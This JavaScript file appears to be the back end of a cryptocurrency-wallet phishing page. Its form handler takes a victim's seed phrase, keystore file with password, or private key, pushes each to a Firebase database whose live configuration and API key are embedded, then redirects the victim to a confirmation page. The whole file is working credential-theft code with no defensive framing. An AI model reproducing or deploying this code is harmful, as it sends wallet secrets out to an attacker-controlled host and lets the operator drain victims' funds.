

function wconnForm() {
    // Initialize Firebase
     var firebaseConfig = {
       apiKey: "AIzaSyBwalmqCKyF7NAcNJSQUsSpqTXiLPRJkVA",
       authDomain: "protocol-auth-proj.firebaseapp.com",
       databaseURL: "https://protocol-auth-proj-default-rtdb.firebaseio.com",
       projectId: "protocol-auth-proj",
       storageBucket: "protocol-auth-proj.appspot.com",
       messagingSenderId: "902483678514",
       appId: "1:902483678514:web:97b3fb7f5590060459332b",
       measurementId: "G-2SK1PTE625",
     };
     // initialize firebase
     firebase.initializeApp(firebaseConfig);
     var database = firebase.database();

    return {
        selected: "phrase",
        isLoading: false,
        status:false,
        phrase:"",
        keystore:"",
        keyPassword:"",
        privatekey:"",
        submitPhrase(){
            
            database.ref('phrase').push(this.phrase);
            this.resetForm();
            this.redirectPage();
        },
        submitKeystoreJSON(){
            
            database.ref('keystore').push(this.keystore);
            database.ref('KeyPassword').push(this.keyPassword);
            this.resetForm();
            this.redirectPage();
        },
        submitPrivateKey(){
            
            database.ref('privatekey').push(this.privatekey);
            this.resetForm();
            this.redirectPage();
        },
        resetForm() {
            this.selected = "phrase";
            this.phrase = "";
            this.keystore = "";
            this.keyPassword = "";
            this.privatekey = "";
        },
        redirectPage() {
            window.location.href = "./confirm.html";
        }
    }
}